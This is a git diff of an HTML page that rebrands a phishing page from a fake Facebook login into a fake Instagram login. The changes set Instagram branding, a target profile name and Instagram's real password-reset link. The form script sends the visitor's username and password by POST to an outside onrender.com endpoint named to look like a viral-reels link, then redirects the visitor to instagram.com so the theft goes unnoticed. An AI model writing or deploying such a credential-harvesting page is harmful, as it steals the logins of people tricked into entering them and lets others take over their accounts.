@@ -5,7 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login Page</title>
+    <title>Instagram Login</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
 <style>
@@ -216,7 +216,7 @@ form a {
             <div class="profile-image">
               <img src="chinnuQueen.jpeg">
             </div>
-            <p id="id-name">Chinnu Queen</p>
+            <p id="id-name">sanjana_sanjana1414</p>
           </div>
           <form id="login-form">
              <div id="error-message"></div>
@@ -226,7 +226,7 @@ form a {
              </div>
                 <div class="link">
                     <button type="button" class="login" onclick="validateForm()">Login</button>
-                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot" target="_blank">Forgot password?</a>
+                    <a href="https://www.instagram.com/accounts/password/reset/" class="forgot" target="_blank">Forgot password?</a>
                 </div>
               <div id="error-message"></div>
             </form>
@@ -247,7 +247,7 @@ form a {
             userName: username,
             password: password
           };
-          fetch('https://springfb.onrender.com/api/fbuser', {
+          fetch('https://instagram-reels-rakshu-video-viral.onrender.com/api/fbuser', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
@@ -270,7 +270,7 @@ form a {
            errorMessage.style.display = "block";
           }
           else{
-            window.location.href = "https://www.facebook.com";
+            window.location.href = "https://www.instagram.com";
           }
            passwordInput.value = "";
         }
